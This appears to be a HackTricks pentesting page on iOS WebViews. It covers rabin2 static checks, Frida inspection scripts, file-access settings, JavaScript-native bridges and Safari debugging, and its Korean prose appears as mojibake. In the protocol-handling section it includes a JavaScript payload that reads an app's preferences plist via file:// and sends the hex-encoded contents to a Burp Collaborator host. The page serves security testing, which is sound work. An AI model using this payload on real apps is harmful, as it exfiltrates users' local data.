# iOS WebViews

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The code of this page was extracted from [here](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Check the page for further details.


## WebViews types

WebViewsëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì—ì„œ ì›¹ ì½˜í…ì¸ ë¥¼ ëŒ€í™”í˜•ìœ¼ë¡œ í‘œì‹œí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ë‹¤ì–‘í•œ ìœ í˜•ì˜ WebViewsëŠ” iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•´ ì„œë¡œ ë‹¤ë¥¸ ê¸°ëŠ¥ê³¼ ë³´ì•ˆ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ê°„ëµí•œ ê°œìš”ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **UIWebView**ëŠ” **JavaScript** ë¹„í™œì„±í™” ì§€ì› ë¶€ì¡±ìœ¼ë¡œ ì¸í•´ iOS 12 ì´í›„ ë” ì´ìƒ ê¶Œì¥ë˜ì§€ ì•Šìœ¼ë©°, ì´ëŠ” ìŠ¤í¬ë¦½íŠ¸ ì£¼ì… ë° **Cross-Site Scripting (XSS)** ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤.

- **WKWebView**ëŠ” ì•±ì— ì›¹ ì½˜í…ì¸ ë¥¼ í†µí•©í•˜ëŠ” ë° ì„ í˜¸ë˜ëŠ” ì˜µì…˜ìœ¼ë¡œ, ì½˜í…ì¸  ë° ë³´ì•ˆ ê¸°ëŠ¥ì— ëŒ€í•œ í–¥ìƒëœ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. **JavaScript**ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í™œì„±í™”ë˜ì–´ ìˆì§€ë§Œ í•„ìš”ì— ë”°ë¼ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ **JavaScript**ê°€ ìë™ìœ¼ë¡œ ì°½ì„ ì—¬ëŠ” ê²ƒì„ ë°©ì§€í•˜ëŠ” ê¸°ëŠ¥ì„ ì§€ì›í•˜ë©°, ëª¨ë“  ì½˜í…ì¸ ê°€ ì•ˆì „í•˜ê²Œ ë¡œë“œë˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ì¶”ê°€ë¡œ, **WKWebView**ì˜ ì•„í‚¤í…ì²˜ëŠ” ë©”ì¸ ì•± í”„ë¡œì„¸ìŠ¤ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ë©”ëª¨ë¦¬ ì†ìƒ ìœ„í—˜ì„ ìµœì†Œí™”í•©ë‹ˆë‹¤.

- **SFSafariViewController**ëŠ” ì•± ë‚´ì—ì„œ í‘œì¤€í™”ëœ ì›¹ ë¸Œë¼ìš°ì§• ê²½í—˜ì„ ì œê³µí•˜ë©°, ì½ê¸° ì „ìš© ì£¼ì†Œ í•„ë“œ, ê³µìœ  ë° íƒìƒ‰ ë²„íŠ¼, Safariì—ì„œ ì½˜í…ì¸ ë¥¼ ì—´ê¸° ìœ„í•œ ì§ì ‘ ë§í¬ë¥¼ í¬í•¨í•œ íŠ¹ì • ë ˆì´ì•„ì›ƒìœ¼ë¡œ ì¸ì‹ë©ë‹ˆë‹¤. **WKWebView**ì™€ ë‹¬ë¦¬ **SFSafariViewController**ì—ì„œëŠ” **JavaScript**ë¥¼ ë¹„í™œì„±í™”í•  ìˆ˜ ì—†ìœ¼ë©°, Safariì™€ ì¿ í‚¤ ë° ë°ì´í„°ë¥¼ ê³µìœ í•˜ì—¬ ì•±ì—ì„œ ì‚¬ìš©ì í”„ë¼ì´ë²„ì‹œë¥¼ ìœ ì§€í•©ë‹ˆë‹¤. App Store ê°€ì´ë“œë¼ì¸ì— ë”°ë¼ ëˆˆì— ë„ê²Œ í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews êµ¬ì„± íƒìƒ‰ ìš”ì•½

### **ì •ì  ë¶„ì„ ê°œìš”**

**WebViews** êµ¬ì„±ì„ ì¡°ì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ ë‘ ê°€ì§€ ì£¼ìš” ìœ í˜•ì— ì´ˆì ì„ ë§ì¶¥ë‹ˆë‹¤: **UIWebView**ì™€ **WKWebView**. ì´ WebViewsë¥¼ ë°”ì´ë„ˆë¦¬ ë‚´ì—ì„œ ì‹ë³„í•˜ê¸° ìœ„í•´ íŠ¹ì • í´ë˜ìŠ¤ ì°¸ì¡° ë° ì´ˆê¸°í™” ë©”ì„œë“œë¥¼ ê²€ìƒ‰í•˜ëŠ” ëª…ë ¹ì´ ì‚¬ìš©ë©ë‹ˆë‹¤.

- **UIWebView ì‹ë³„**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
ì´ ëª…ë ¹ì€ ì´ì§„ íŒŒì¼ì—ì„œ ê´€ë ¨ í…ìŠ¤íŠ¸ ë¬¸ìì—´ì„ ê²€ìƒ‰í•˜ì—¬ **UIWebView** ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì°¾ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

- **WKWebView ì‹ë³„**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
ìœ ì‚¬í•˜ê²Œ, **WKWebView**ì˜ ê²½ìš°, ì´ ëª…ë ¹ì€ ì‚¬ìš©ì„ ë‚˜íƒ€ë‚´ëŠ” í…ìŠ¤íŠ¸ ë¬¸ìì—´ì„ ì´ì§„ íŒŒì¼ì—ì„œ ê²€ìƒ‰í•©ë‹ˆë‹¤.

ë˜í•œ, **WKWebView**ê°€ ì–´ë–»ê²Œ ì´ˆê¸°í™”ë˜ëŠ”ì§€ ì°¾ê¸° ìœ„í•´, ì´ˆê¸°í™”ì™€ ê´€ë ¨ëœ ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ë¥¼ ëŒ€ìƒìœ¼ë¡œ ë‹¤ìŒ ëª…ë ¹ì´ ì‹¤í–‰ë©ë‹ˆë‹¤:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript êµ¬ì„± í™•ì¸**

**WKWebView**ì˜ ê²½ìš°, í•„ìš”í•˜ì§€ ì•Šì€ ê²½ìš° JavaScriptë¥¼ ë¹„í™œì„±í™”í•˜ëŠ” ê²ƒì´ ëª¨ë²” ì‚¬ë¡€ë¡œ ê°•ì¡°ë©ë‹ˆë‹¤. ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ë¥¼ ê²€ìƒ‰í•˜ì—¬ `javaScriptEnabled` ì†ì„±ì´ `false`ë¡œ ì„¤ì •ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ì—¬ JavaScriptê°€ ë¹„í™œì„±í™”ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **ì˜¤ì§ ì•ˆì „í•œ ì½˜í…ì¸  ê²€ì¦**

**WKWebView**ëŠ” **UIWebView**ì™€ ëŒ€ì¡°ì ìœ¼ë¡œ í˜¼í•© ì½˜í…ì¸  ë¬¸ì œë¥¼ ì‹ë³„í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŠ” ëª¨ë“  í˜ì´ì§€ ë¦¬ì†ŒìŠ¤ê°€ ì•ˆì „í•œ ì—°ê²°ì„ í†µí•´ ë¡œë“œë˜ë„ë¡ `hasOnlySecureContent` ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬ í™•ì¸ë©ë‹ˆë‹¤. ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì—ì„œì˜ ê²€ìƒ‰ì€ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **ë™ì  ë¶„ì„ í†µì°°ë ¥**

ë™ì  ë¶„ì„ì€ WebView ì¸ìŠ¤í„´ìŠ¤ì™€ ê·¸ ì†ì„±ì„ ê²€ì‚¬í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ `webviews_inspector.js`ë¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚¬ìš©ë˜ë©°, `UIWebView`, `WKWebView`, ë° `SFSafariViewController` ì¸ìŠ¤í„´ìŠ¤ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë°œê²¬ëœ ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ì •ë³´, URL ë° JavaScriptì™€ ë³´ì•ˆ ì½˜í…ì¸ ì™€ ê´€ë ¨ëœ ì„¤ì •ì„ ê¸°ë¡í•©ë‹ˆë‹¤.

í™ ê²€ì‚¬ëŠ” `ObjC.choose()`ë¥¼ ì‚¬ìš©í•˜ì—¬ WebView ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹ë³„í•˜ê³  `javaScriptEnabled` ë° `hasonlysecurecontent` ì†ì„±ì„ í™•ì¸í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì‹¤í–‰ë©ë‹ˆë‹¤:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**ì£¼ìš” ê²°ê³¼**:
- WebView ì¸ìŠ¤í„´ìŠ¤ê°€ ì„±ê³µì ìœ¼ë¡œ ìœ„ì¹˜ í™•ì¸ë˜ê³  ê²€ì‚¬ë¨.
- JavaScript í™œì„±í™” ë° ë³´ì•ˆ ì½˜í…ì¸  ì„¤ì •ì´ ê²€ì¦ë¨.

ì´ ìš”ì•½ì€ JavaScript í™œì„±í™” ë° í˜¼í•© ì½˜í…ì¸  ê°ì§€ì™€ ê°™ì€ ë³´ì•ˆ ê¸°ëŠ¥ì— ì¤‘ì ì„ ë‘ê³  ì •ì  ë° ë™ì  ì ‘ê·¼ ë°©ì‹ì„ í†µí•´ WebView êµ¬ì„± ë¶„ì„ì— ê´€ë ¨ëœ ì¤‘ìš”í•œ ë‹¨ê³„ì™€ ëª…ë ¹ì„ ìš”ì•½í•©ë‹ˆë‹¤.

## WebView í”„ë¡œí† ì½œ ì²˜ë¦¬

WebViewì—ì„œ ì½˜í…ì¸ ë¥¼ ì²˜ë¦¬í•˜ëŠ” ê²ƒì€ ì¤‘ìš”í•œ ì¸¡ë©´ìœ¼ë¡œ, `http(s)://`, `file://`, `tel://`ì™€ ê°™ì€ ë‹¤ì–‘í•œ í”„ë¡œí† ì½œì„ ë‹¤ë£° ë•Œ íŠ¹íˆ ê·¸ë ‡ìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í”„ë¡œí† ì½œì€ ì•± ë‚´ì—ì„œ ì›ê²© ë° ë¡œì»¬ ì½˜í…ì¸ ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ë¡œì»¬ ì½˜í…ì¸ ë¥¼ ë¡œë“œí•  ë•ŒëŠ” ì‚¬ìš©ìê°€ íŒŒì¼ì˜ ì´ë¦„ì´ë‚˜ ê²½ë¡œì— ì˜í–¥ì„ ë¯¸ì¹˜ê±°ë‚˜ ì½˜í…ì¸  ìì²´ë¥¼ í¸ì§‘í•˜ì§€ ëª»í•˜ë„ë¡ ì£¼ì˜í•´ì•¼ í•œë‹¤ëŠ” ì ì´ ê°•ì¡°ë©ë‹ˆë‹¤.

**WebViews**ëŠ” ì½˜í…ì¸  ë¡œë”©ì„ ìœ„í•œ ë‹¤ì–‘í•œ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ì œ ë” ì´ìƒ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” **UIWebView**ì˜ ê²½ìš°, `loadHTMLString:baseURL:` ë° `loadData:MIMEType:textEncodingName:baseURL:`ì™€ ê°™ì€ ë°©ë²•ì´ ì‚¬ìš©ë©ë‹ˆë‹¤. ë°˜ë©´ **WKWebView**ëŠ” ì›¹ ì½˜í…ì¸ ë¥¼ ìœ„í•´ `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:`, ë° `loadRequest:`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ `pathForResource:ofType:`, `URLForResource:withExtension:`, ë° `init(contentsOf:encoding:)`ì™€ ê°™ì€ ë°©ë²•ì´ í™œìš©ë©ë‹ˆë‹¤. `loadFileURL:allowingReadAccessToURL:` ë©”ì„œë“œëŠ” íŠ¹ì • URL ë˜ëŠ” ë””ë ‰í† ë¦¬ë¥¼ WebViewì— ë¡œë“œí•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ìœ¼ë¡œ íŠ¹íˆ ì£¼ëª©í•  ë§Œí•˜ë©°, ë””ë ‰í† ë¦¬ê°€ ì§€ì •ë  ê²½ìš° ë¯¼ê°í•œ ë°ì´í„°ê°€ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì†ŒìŠ¤ ì½”ë“œë‚˜ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì—ì„œ ì´ëŸ¬í•œ ë°©ë²•ì„ ì°¾ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Regarding **file access**, UIWebViewëŠ” ì´ë¥¼ ë³´í¸ì ìœ¼ë¡œ í—ˆìš©í•˜ëŠ” ë°˜ë©´, WKWebViewëŠ” íŒŒì¼ URLì—ì„œì˜ ì ‘ê·¼ì„ ê´€ë¦¬í•˜ê¸° ìœ„í•´ `allowFileAccessFromFileURLs` ë° `allowUniversalAccessFromFileURLs` ì„¤ì •ì„ ë„ì…í•˜ë©°, ë‘ ì„¤ì • ëª¨ë‘ ê¸°ë³¸ê°’ì€ falseì…ë‹ˆë‹¤.

ë³´ì•ˆ ì„¤ì •ì„ ê²€ì‚¬í•˜ê¸° ìœ„í•œ **WKWebView** êµ¬ì„±ì˜ Frida ìŠ¤í¬ë¦½íŠ¸ ì˜ˆì œê°€ ì œê³µë©ë‹ˆë‹¤:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
ë§ˆì§€ë§‰ìœ¼ë¡œ, ë¡œì»¬ íŒŒì¼ì„ ìœ ì¶œí•˜ê¸° ìœ„í•œ JavaScript í˜ì´ë¡œë“œì˜ ì˜ˆëŠ” ì˜ëª» êµ¬ì„±ëœ WebViewsì™€ ê´€ë ¨ëœ ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œëŠ” íŒŒì¼ ë‚´ìš©ì„ í—¥ìŠ¤ í˜•ì‹ìœ¼ë¡œ ì¸ì½”ë”©í•œ í›„ ì„œë²„ë¡œ ì „ì†¡í•˜ì—¬ WebView êµ¬í˜„ì—ì„œ ì—„ê²©í•œ ë³´ì•ˆ ì¡°ì¹˜ì˜ ì¤‘ìš”ì„±ì„ ê°•ì¡°í•©ë‹ˆë‹¤.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Native Methods Exposed Through WebViews

## Understanding WebView Native Interfaces in iOS

iOS 7ë¶€í„° Appleì€ **WebViewì˜ JavaScriptì™€ ë„¤ì´í‹°ë¸Œ** Swift ë˜ëŠ” Objective-C ê°ì²´ ê°„ì˜ í†µì‹ ì„ ìœ„í•œ APIë¥¼ ì œê³µí–ˆìŠµë‹ˆë‹¤. ì´ í†µí•©ì€ ì£¼ë¡œ ë‘ ê°€ì§€ ë°©ë²•ì„ í†µí•´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤:

- **JSContext**: Swift ë˜ëŠ” Objective-C ë¸”ë¡ì´ `JSContext` ë‚´ì˜ ì‹ë³„ìì— ì—°ê²°ë  ë•Œ JavaScript í•¨ìˆ˜ê°€ ìë™ìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ JavaScriptì™€ ë„¤ì´í‹°ë¸Œ ì½”ë“œ ê°„ì˜ ì›í™œí•œ í†µí•© ë° í†µì‹ ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
- **JSExport Protocol**: `JSExport` í”„ë¡œí† ì½œì„ ìƒì†í•¨ìœ¼ë¡œì¨ ë„¤ì´í‹°ë¸Œ ì†ì„±, ì¸ìŠ¤í„´ìŠ¤ ë©”ì„œë“œ ë° í´ë˜ìŠ¤ ë©”ì„œë“œë¥¼ JavaScriptì— ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” JavaScript í™˜ê²½ì—ì„œ ì´ë£¨ì–´ì§„ ëª¨ë“  ë³€ê²½ ì‚¬í•­ì´ ë„¤ì´í‹°ë¸Œ í™˜ê²½ì— ë°˜ì˜ë˜ê³  ê·¸ ë°˜ëŒ€ë„ ë§ˆì°¬ê°€ì§€ì„ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ë°©ë²•ì„ í†µí•´ ë¯¼ê°í•œ ë°ì´í„°ê°€ ìš°ë°œì ìœ¼ë¡œ ë…¸ì¶œë˜ì§€ ì•Šë„ë¡ í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

### Accessing `JSContext` in Objective-C

Objective-Cì—ì„œ `UIWebView`ì˜ `JSContext`ëŠ” ë‹¤ìŒ ì½”ë“œ í•œ ì¤„ë¡œ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Communication with `WKWebView`

`WKWebView`ì˜ ê²½ìš°, `JSContext`ì— ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ëŒ€ì‹ , JavaScriptì™€ ë„¤ì´í‹°ë¸Œ ê°„ì˜ í†µì‹ ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” `postMessage` í•¨ìˆ˜ë¥¼ í†µí•´ ë©”ì‹œì§€ ì „ë‹¬ì´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë©”ì‹œì§€ì— ëŒ€í•œ í•¸ë“¤ëŸ¬ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì„¤ì •ë˜ì–´, JavaScriptê°€ ë„¤ì´í‹°ë¸Œ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ì•ˆì „í•˜ê²Œ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaction and Testing

JavaScriptëŠ” ìŠ¤í¬ë¦½íŠ¸ ë©”ì‹œì§€ í•¸ë“¤ëŸ¬ë¥¼ ì •ì˜í•˜ì—¬ ë„¤ì´í‹°ë¸Œ ë ˆì´ì–´ì™€ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì›¹í˜ì´ì§€ì—ì„œ ë„¤ì´í‹°ë¸Œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒê³¼ ê°™ì€ ì‘ì—…ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
ë„¤ì´í‹°ë¸Œ í•¨ìˆ˜ í˜¸ì¶œì˜ ê²°ê³¼ë¥¼ ìº¡ì²˜í•˜ê³  ì¡°ì‘í•˜ê¸° ìœ„í•´, HTML ë‚´ì—ì„œ ì½œë°± í•¨ìˆ˜ë¥¼ ì˜¤ë²„ë¼ì´ë“œí•  ìˆ˜ ìˆë‹¤:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
ë„¤ì´í‹°ë¸Œ ì¸¡ì€ `JavaScriptBridgeMessageHandler` í´ë˜ìŠ¤ì—ì„œ ë³´ì—¬ì¤€ ê²ƒì²˜ëŸ¼ JavaScript í˜¸ì¶œì„ ì²˜ë¦¬í•˜ë©°, ìˆ«ì ê³±ì…ˆê³¼ ê°™ì€ ì‘ì—…ì˜ ê²°ê³¼ë¥¼ ì²˜ë¦¬í•˜ê³  ì´ë¥¼ JavaScriptë¡œ ë‹¤ì‹œ ì „ì†¡í•˜ì—¬ í‘œì‹œí•˜ê±°ë‚˜ ì¶”ê°€ ì¡°ì‘ì„ ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## iOS WebViews ë””ë²„ê¹…

(Tutorial based on the one from [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

iOS webviews ë‚´ì˜ ì›¹ ì½˜í…ì¸ ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ë””ë²„ê¹…í•˜ë ¤ë©´ `console.log()`ì— ì „ì†¡ëœ ë©”ì‹œì§€ê°€ Xcode ë¡œê·¸ì— í‘œì‹œë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— Safariì˜ ê°œë°œì ë„êµ¬ë¥¼ í¬í•¨í•œ íŠ¹ì • ì„¤ì •ì´ í•„ìš”í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ì£¼ìš” ë‹¨ê³„ì™€ ìš”êµ¬ ì‚¬í•­ì„ ê°•ì¡°í•œ ê°„ë‹¨í•œ ê°€ì´ë“œì…ë‹ˆë‹¤:

- **iOS ê¸°ê¸° ì¤€ë¹„**: iOS ê¸°ê¸°ì—ì„œ Safari ì›¹ ê²€ì‚¬ê¸°ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” **ì„¤ì • > Safari > ê³ ê¸‰**ìœ¼ë¡œ ì´ë™í•˜ì—¬ _ì›¹ ê²€ì‚¬ê¸°_ë¥¼ í™œì„±í™”í•¨ìœ¼ë¡œì¨ ìˆ˜í–‰ë©ë‹ˆë‹¤.

- **macOS ê¸°ê¸° ì¤€ë¹„**: macOS ê°œë°œ ë¨¸ì‹ ì—ì„œ Safari ë‚´ì˜ ê°œë°œì ë„êµ¬ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤. Safarië¥¼ ì‹¤í–‰í•˜ê³  **Safari > í™˜ê²½ì„¤ì • > ê³ ê¸‰**ì— ì ‘ê·¼í•˜ì—¬ _ê°œë°œ ë©”ë‰´ í‘œì‹œ_ ì˜µì…˜ì„ ì„ íƒí•©ë‹ˆë‹¤.

- **ì—°ê²° ë° ë””ë²„ê¹…**: iOS ê¸°ê¸°ë¥¼ macOS ì»´í“¨í„°ì— ì—°ê²°í•˜ê³  ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•œ í›„, macOS ê¸°ê¸°ì—ì„œ Safarië¥¼ ì‚¬ìš©í•˜ì—¬ ë””ë²„ê¹…í•  ì›¹ë·°ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. Safariì˜ ë©”ë‰´ ë°”ì—ì„œ _ê°œë°œ_ë¡œ ì´ë™í•˜ê³  iOS ê¸°ê¸° ì´ë¦„ ìœ„ì— ë§ˆìš°ìŠ¤ë¥¼ ì˜¬ë ¤ ì›¹ë·° ì¸ìŠ¤í„´ìŠ¤ ëª©ë¡ì„ í™•ì¸í•œ í›„, ê²€ì‚¬í•  ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. ì´ ëª©ì ì„ ìœ„í•´ ìƒˆë¡œìš´ Safari ì›¹ ê²€ì‚¬ê¸° ì°½ì´ ì—´ë¦½ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì œí•œ ì‚¬í•­ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤:

- ì´ ë°©ë²•ìœ¼ë¡œ ë””ë²„ê¹…í•˜ë ¤ë©´ macOS ê¸°ê¸°ê°€ í•„ìš”í•©ë‹ˆë‹¤. ì´ëŠ” Safariì— ì˜ì¡´í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
